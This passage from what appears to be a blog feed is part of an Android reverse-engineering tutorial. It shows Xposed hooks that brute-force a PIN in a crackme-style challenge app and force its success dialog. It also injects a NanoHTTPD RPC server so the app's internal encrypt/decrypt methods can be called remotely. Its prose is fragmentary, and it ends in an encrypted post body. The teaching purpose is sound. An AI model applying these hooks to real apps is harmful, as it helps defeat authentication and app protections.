class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java ConstructornewInstance</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">//  Verifier </span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> XposedHelpers.findConstructorExact(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Verifier</span> <span class="operator">=</span> cons.newInstance();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// Verifier  verifyPassword</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">boolean</span>)XposedHelpers.callMethod(Verifier, <span class="string">&quot;verifyPassword&quot;</span>, context, String.valueOf(i)))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// XposedHelpers.newInstance()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">//  Verifier </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Verifier</span> <span class="operator">=</span> XposedHelpers.newInstance(clazz);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// Verifier  verifyPassword</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">boolean</span>)XposedHelpers.callMethod(Verifier, <span class="string">&quot;verifyPassword&quot;</span>, context, String.valueOf(i)))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;<code>xposed hookverifierstaticverifierhook</code>hookMainActivityshowSuccessDialog<code>hook MainActivityonCreateMainActivityhookafterHookMethodshowSuccessDialog</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">//  MainActivity </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;org.teamsik.ahe17.qualification.MainActivity&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// hook onCreate</span></span><br><span class="line">        XposedBridge.hookAllMethods(clazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                <span class="comment">//  MainActivity </span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">mMainActivity</span> <span class="operator">=</span> param.thisObject;</span><br><span class="line">                <span class="comment">//  showSuccessDialog </span></span><br><span class="line">                XposedHelpers.callMethod(mMainActivity, <span class="string">&quot;showSuccessDialog&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;example.apkcongratulation</p><h4 id="Xposed--NanoHTTPD--RPC-"><a href="#Xposed--NanoHTTPD--RPC-" class="headerlink" title="Xposed  NanoHTTPD  RPC "></a>Xposed  NanoHTTPD  RPC </h4><p>&emsp;XposedRPCNanoHTTPDHTTPwebdemoso1nativemethod01method02</p><p>&emsp;xposedmethod01method02</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.example.demoso1&quot;</span>))&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.example.demoso1.MainActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// 1 hook  MainActivity </span></span><br><span class="line">        <span class="comment">//  object  hook onCreate </span></span><br><span class="line">        XposedBridge.hookAllMethods(clazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">            <span class="comment">//  method01  method02  native  onCreate  method01/02 </span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                <span class="comment">//  MainActivity </span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">mMainActivity</span> <span class="operator">=</span> param.thisObject;</span><br><span class="line">                <span class="comment">//  method01  method02 </span></span><br><span class="line">                <span class="type">String</span> <span class="variable">cipherText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(mMainActivity, <span class="string">&quot;method01&quot;</span>, <span class="string">&quot;wd2711&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">clearText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(mMainActivity, <span class="string">&quot;method02&quot;</span>, <span class="string">&quot;47fcda3822cd10a8e2f667fa49da783f&quot;</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;(1) cipherText =&gt; &quot;</span> + cipherText);</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;(1) clearText =&gt; &quot;</span> + clearText);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 2 newInstance </span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">newMainActivity</span> <span class="operator">=</span> XposedHelpers.newInstance(clazz);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cipherText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(newMainActivity, <span class="string">&quot;method01&quot;</span>, <span class="string">&quot;wd2711&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">clearText</span> <span class="operator">=</span> (String)XposedHelpers.callMethod(newMainActivity, <span class="string">&quot;method02&quot;</span>, <span class="string">&quot;47fcda3822cd10a8e2f667fa49da783f&quot;</span>);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;(2) cipherText =&gt; &quot;</span> + cipherText);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;(2) clearText =&gt; &quot;</span> + clearText);</span><br><span class="line">        <span class="comment">// logic-4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;</p><p><img src="/images/frida-reverse-analysis-2/image-20231022154106062.png" alt="image-20231022154106062" style="zoom:67%;" /></p><p>&emsp;NanoHTTPDRPC</p><p>1app/build.gradledependencies</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation &#x27;org.nanohttpd:nanohttpd:2.3.1&#x27;</span><br></pre></td></tr></table></figure><p>&emsp;NanohttpdNanoHTTPDstartwebstopwebserveweb<code>serveIHTTPSessionURL</code>NanoHTTPDwebNanoHTTPDhello worldlogic-4</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_">NanoHTTPD</span>&#123;</span><br><span class="line">    <span class="comment">// App </span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">App</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="built_in">super</span>(<span class="number">8899</span>);</span><br><span class="line">        <span class="comment">// start  HTTP </span></span><br><span class="line">        start(NanoHTTPD.SOCKET_READ_TIMEOUT, <span class="literal">true</span>);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Running!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// serve </span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> NanoHTTPD.Response <span class="title function_">serve</span><span class="params">(IHTTPSession session)</span>&#123;</span><br><span class="line">        <span class="comment">//  HTTP POSTGET</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> session.getMethod();</span><br><span class="line">        <span class="comment">//  URI</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> session.getUri();</span><br><span class="line">        <span class="comment">//  IP</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">RemoteIP</span> <span class="operator">=</span> session.getRemoteIpAddress();</span><br><span class="line">        <span class="comment">//  HostName</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">RemoteHostName</span> <span class="operator">=</span> session.getRemoteHostName();</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;Method =&gt; &quot;</span> + method);</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;URI =&gt; &quot;</span> + uri);</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;Remote_IP =&gt; &quot;</span> + RemoteIP);</span><br><span class="line">        Log.i(<span class="string">&quot;nanohttpd&quot;</span>, <span class="string">&quot;RemoteHostName =&gt; &quot;</span> + RemoteHostName);</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;&lt;html&gt;&lt;body&gt;Hello wd2711\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> newFixedLengthResponse(Response.Status.OK, NanoHTTPD.MIME_PLAINTEXT, msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">App</span>();</span><br></pre></td></tr></table></figure><p>&emsp;xposeddemoso1<code>IP+</code></p><p><img src="/images/frida-reverse-analysis-2/image-20231022160559470.png" alt="image-20231022160559470" style="zoom:67%;" /></p><p>&emsp;</p><p><img src="/images/frida-reverse-analysis-2/image-20231022160635723.png" alt="image-20231022160635723" style="zoom:67%;" /></p><p>2NanoHTTPDserve</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> NanoHTTPD.Response <span class="title function_">serve</span><span class="params">(IHTTPSession session)</span>&#123;</span><br><span class="line">    <span class="comment">//  URI</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> session.getUri();</span><br><span class="line">    <span class="comment">//  POST </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">paramBody</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    Map&lt;String, String&gt;params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// session.parseBody(params)  parse  session </span></span><br><span class="line">        session.parseBody(params);</span><br><span class="line">        paramBody = session.getQueryParameterString();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ResponseException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(uri.contains(<span class="string">&quot;encrypt&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// getActivity()  MainActivity </span></span><br><span class="line">        result = (String)XposedHelpers.callMethod(getActivity(), <span class="string">&quot;method01&quot;</span>, paramBody);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(uri.contains(<span class="string">&quot;decrypt&quot;</span>))&#123;</span><br><span class="line">        result = (String)XposedHelpers.callMethod(getActivity(), <span class="string">&quot;method02&quot;</span>, paramBody);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newFixedLengthResponse(Response.Status.OK, NanoHTTPD.MIME_PLAINTEXT, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;xposeddemoso1 curlpost</p><p><img src="/images/frida-reverse-analysis-2/image-20231022164520100.png" alt="image-20231022164520100" style="zoom:67%;" /></p><p>3python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">param</span>):</span><br><span class="line">    url = <span class="string">&quot;http://192.168.48.14:8899/encrypt&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url = url, data = param, headers = headers)</span><br><span class="line">    <span class="built_in">print</span>(r.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">param</span>):</span><br><span class="line">    url = <span class="string">&quot;http://192.168.48.14:8899/decrypt&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url = url, data = param, headers = headers)</span><br><span class="line">    <span class="built_in">print</span>(r.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    encrypt(<span class="string">&quot;wd&quot;</span>)</span><br><span class="line">    decrypt(<span class="string">&quot;169dc260893dab88cd619d5e35e17634&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;Hookfridaxposed<code>xposedsetAdditionalInstanceFieldsetAdditionalStaticFieldfridaJava.choosefridaHookxposed</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Frida-2&quot;&gt;&lt;a href=&quot;#Frida-2&quot; class=&quot;headerlink&quot; title=&quot;Frida-2&quot;&gt;&lt;/a&gt;Frida-2&lt;/h1&gt;&lt;p&gt;&amp;emsp;frida&lt;/p&gt;</summary>
    
    
    
    <category term="re-book" scheme="https://wd-2711.tech/categories/re-book/"/>
    
    
  </entry>
  
  <entry>
    <title>intern-ms-prepare</title>
    <link href="https://wd-2711.tech/2023/09/25/intern-ms-prepare/"/>
    <id>https://wd-2711.tech/2023/09/25/intern-ms-prepare/</id>
    <published>2023-09-25T08:14:56.000Z</published>
    <updated>2023-10-07T06:51:04.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c963127f8aac97877aec58fbe696cb289c48ded0a8b52877523164b0abe6471a">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d55b5de3ad3678700c74bc3565095ff8718d1108a9dbc09cb1fbbfecee21d1a36da200d77877ff0bc8fa6417c4bb0b69671d8b2cbeded64bbb86392ddb8fa44ec993d0ac48ec1b58de64dd617dadcb8caf75ab1eedf14842c11703a57c093b7d388ef187b9aae90506d1d115d387aedbf282d12c90197a3c56a67ee37059a8beecc7a21d4f9b78657e291f697d599ec8567fbeef61115aa63e89879a5f4636adb842bc53eac5a1a317879b63e2e276b0437d1fc83c0a495b8682a549f4fbd534ec591201a3afb0c27e72ed35c60839373b16849067fadc07fc1feb7aa26d94e626c70f363a4aee92269579ea05f8c903d818542372aaa174595aef1958a1267285f37298f324e6adcacc7adeb6d753e2d62453ab63469d953cd0ccc9cf4d8ab0a6fdb3469f63b9ba84f87cf7b1365a6d154841579626651931f6767ab67d0eaf9510e238f46c5796b96c7be38085ffecec10bd1470dd62efe523a75001cf3db1fec4af9fa39980d4c6daacf67281057caf2cab7bc2fb3d8f156b312f0f978ca46c8b2ef66441d694e2f512e7d111df76aa1e5c2841dfb6a05bbc49a1951f0062697fd9a9478abef84e81123692f1f0fa8fabcaa5c6c22be28c4e30b9181f14295129e8a614d2e16e5769688473087e96600de4861db2704fc7cadf8faa2ff36f8914872942f41191122bb318b8270898bdd52dfab9eb9fe6a7a062e83b649fa6d4365a8276b6323258c0f4741d7baa16331098f95b968daf2484ffc585d50e621f5baa8bdeb97186fc455ec7ce8c1c461afe272a4621b1c45916ad9269eace8f57c93e1f2baa4dd68d5179780971d3304e3c618bfa0245f332476e9efd0463f4db2d132dce79b187bcd48c78a72124e67df253e0b75cd81b55eb36a2595828b4d1052cd98cd6e2b5c5178364d12907a1e3b9fcc7a82db3abf6e53eeff5fd5717f58dd025a0c25ade570de6ed6cab54e04e022f38505738d909269c604c585cbd6448289fc0b763899059dd5746285a1d974ea722a3d11a25ab7cabb8745a80d13f1d36d6a2c77e65f5d71a8053b4c4b6709a7ee9f03e4c43d5b4ee07372719fa72284538f2353b73b2a7aa07522c6a831698019c32be95da14900bcb76cc5337d1988a2d5779e6c7939492e3a4618ce1223c76c517b007623a00bf15e7752f4753ed004eabc2ac9007259f4529718fdfeafa9b85338f6b8e89e7030251e09245b2c2ea26f674200db0777ca45357abe565d440c229271eadda669b3e73a256525d125e6652ab53f4d6cffb63c92d44ad17d5faa6d84da2777f8f426591e89eaf5744dcc6c0b1010e0d72271dd4cb3580acbca968f7b1c8fa22246afc96ccd8a0775f5abf309652bd270505ef6bba78947cd463fcf316130f30c0604cdea8d44dacbd35abbffa9b2b3c0d08018b1bf4ee48baac940050b9a5811c42bb2be3874728f2fddb304ac0c03f40a3d4d6b686111906586768dc28713f0fc9a3f7a6cc1e2ce913cda132d7b6eb6f216ee551d0dee989044abc08d6da2b6a3ca72b42321ab5a58c9c2fede93f8d02b98aa505b2982cff7e1ee69f2218723387eab9cdffab09e71bd147eb8b92575c17e756fe4a6f391b35770f3ed6637d119f7e9b8aac8688eecfbdc225e1bc4b843ac130801575ad42f1c778db009a09eb03314d2d6267c988b15cd83cedff1a3ee4ba322b9fae56e78cc3a8248ea49f3deb1c11d6fed37eba1f4bfebe961819d11f7bf0a0a8a006ffb93915f55b56ba80211426c4ac3c84a4a0f92bc2b32a21f888f670c8a969cd4e849acf1ca7d81ef5415d6c19d427f9bf07e14e63187b0d781f2161993a182d1876e172daf5d7fdf4dad4f64fac0dab2617ba551492391706bc3164ad38c5d7674964e2fab5bf3b2e9038b39684452e726259139ebe145e7d45f3e942b102f744be2d71bbed733d42fdbf5e7da35325eb7d4b49f74903a0423b020329716398b96776523d01b65d6079ebcc20f2ee7ab54745d52b968dd295f338aaa95444cfd3de44fcff6336c89ad113785e8b33ecc7b5aebfadf2ab573569f8b0232ef1c84c34cbaf5e836b43721f31aae335ecb8bdfc223997131db033d49b4f178cf0af76a307362200c0dda161988c677e5f73cd4849cc9b6d8f7f6f1a6f3c5fc4f65d0f89f9b7bba9c51ce2f2724d537cacebe3cc963b230ca9eab73c78a0dc6b3f1359781b3a6d817be82e24c61522553f4ba4405a25804d61b42cf71c7bbaa510beecdcbe4cbfdcf376ff2262de06ee258e9137b93ab284fbe9b4e1e1a530c130a19bc9289ff7bba71dcd561848c7cb0f6f25a8c72a225c19529c313740d2c2cf4c85576b955b4a824b2865c62449667583e0001039d0c800c957301bc177d659e723f28ccd2db71f1cbbd2bd9fe328fb1732fd5509211d7964de083738e5860eb451083bf4ef5e200630af4a8ae5ffb2572a0a7a6448396875a06a20c5500a3a712782df252d180c784291167af78c0d02b04cb696d96a3c5a3047465d2af21bd2739a465d364476389fd73bf9966f6a8329516ceac05ccfedd9399a4bababe90bffefdad8c388391189021c03f386a9d05921f655ee364be27b1c8be87202239fcf1e436883a67f95e49a15a0b320b0e1693b128f7eef70a8ae7c2b7970c20672b8388d08d68be169aa99498250e501b24c463ea6cd8d48dcd9f147f6f851d87aecbad77fcc8b3c0eb079cbc76f86e5eeb5c96e2371e1650abcf9ca9a135e8542176efe0169e6dadbf5d485da2bcfdb97a00cebfa0ebd4f4a981252ef44dd30243a2c0e74a6fd1aa5285673b32fc1cfc4b8e9479d77326563b95ea2575c52c370406f1ba2d63d37ff830da9ca08309ee5e3bc3832aee67a9d057ff00a511a937e45fd6157801069ff047ec6c64b03a7124814c3ce7e7d512e9521ed5d1d2fce3afadfd43e33071b804dac868f2c01aa9c016749f42b42de46a978272c52dc236db190f4f3fd9e7a1ccd781e0d8f6b074deef988d88994c121e4d14c53f761b73a390e91e6a3bba604e2045d5b4cdda23cce9633d30b0d0f98dd36f044d6d405ae4bac8d18014a958e1bf49b36c4c29c6b95f03d313809a11ebc293fa0e16b9fce4f9ae8781a4f58924c8889a6ebd8b0f98757d5f9d95db7bdf49d36f0a999e6071b64b5300e9e017bfdf3b8d3839d0d256129228f50890acee9f7e2eeaa8135cd7c1b57c41c941738a3268e29e5afbb6c0ee3fe4828afa430cbbf4c482f977b57c00fc3bde82bc5486cb0ce1ca864b9b83fc79e04882bb89b65e93c0ac93505d8f3b5bd98c23bc34b42bfdec15c089b2ac0aeb69dde4a808beb443403a764aae998b5c2c82c44e41d0b886679e6b4de2ecf32a9743f9260c7a7a83ba6d400f9b026a7bbb10e766d939ce120939bf24c15c2ec8fe644ad4210ecf4852fac853f8e257447cc67d3b0167f848b019c6f801e71e5b3f76a009b1b8b619171649df255a5097104ea30f97fca0892bcf2d6a83519b51d706e789a33c2d9d7cff1bf2034769108bb342e707f52bebf6c532390ff6c4ad265e498af1a74145e07424df8d3f100ace75b70558bbb598072c4f42883137bd91fe09316941b47e3376f25eb7ff1fde678a93cf9c30549740ea63cff896afec919b749cd9063a500ada1f3f8f2da0f9a8763a554d3a3b22e39605322eafce9cfb89bb14cad00067516cdc6776f859b99d9d97eba884abe9ccf9537359eb8ea824bfac12998c6d84dd842d14a87a3152d13cfcde7ade8d4aecd02bd3008ae3523e24d1c52becba385598923dbdaa180aa6337500f771054cbe59faed91933cb9dfde770ff967895e2d500589602bcb2cddf8b5b6e683176ffec2a3c64fb207c7371bca3adeb7b8a2a0c0b7f746acaa4b1a85cb071ada39d5525dd42eea6f0b41e9f50d104f6762963223cfd76ce3305f712dee975c3edcda71cffa574b275de4c55ec751ffe1e5162432a11a742b1e0364bf7623872e6a0e4a8d8333ab95426fbd0ef16ba2158f21bb0096c63f6aafdb8f51bc8a7a4786c0295b9ae5fa504b218aabde3420e16f350ec33d8253c1f44a4e4d14726420ded4213a5e8e3a8efe6bd14cb0920895380abd91434ac533958d16c190af8138856ac2139187eb6de3283232d8c9b2f2da4899b06f06024d5bc60f7ef80f89e6a088468e78e8526463c4802d170cac1c7170527363a13d987fffbc216721c01c58350db3d94fac3cabc75f78eaa10c1b455e64d28956c07cdd0d88bc47536ef93b0ed7842a74ad06039708e3ab3fdb0345df2bf107889f08f073454267a7b604453accc5589bbbbfad426649071f8c068b60f60c9bef5bb2d3fe595a4600e10ce6e2cb3cb6dfbdee8b96a476eed69d9f41f2f6f83cb62704589500025363b0ef37f7e3fc048bbd3937478829bd5b12073368eb0cf7c798e6360e8e11a50decef3019f39644a75456cf70fcfc2dfbae20e3be05d24156480d4977ccd7bd18ca10588aa82f3b8d3ba20dc4b954c68a936d1f64d4910530b0ed3d9eae0977d52f9d79db769ae4147784d8296ced99619209e2d6c7420077d93a7ef5dc71d660233475b49c145b6a7de25d440e58367362fe6ce6a728cd5bfe5ab22d15b3618303a659d0495dd1d7f9d61999ca548decb17b5f370407dbbd724d6f1f690c9737b9d822910d7777972d6b629b93264211050c3f8a07a70386826d436e9cca0fa82f35adb034d696b3e67ac8dcd463925df5319f38deadb8917472e637cc590e68aa6ff52433092ff3028e5dbe63fdd4be4d07ac855d302feccc9a62093dfc0e1bbdd0935fb8e87b6c012221f79175d63f4e0d3a141512f41917d856eef62a79132874c733610d3c28470e6170bd51b37255e501229ca5fbe2b5cb07ede689764fefab1fbbd6927cebf1de91363e7ce882e8a006b19d50d0c3165813ce611bbe4418a4ee98a38c86ba15a5d6d65abb26a151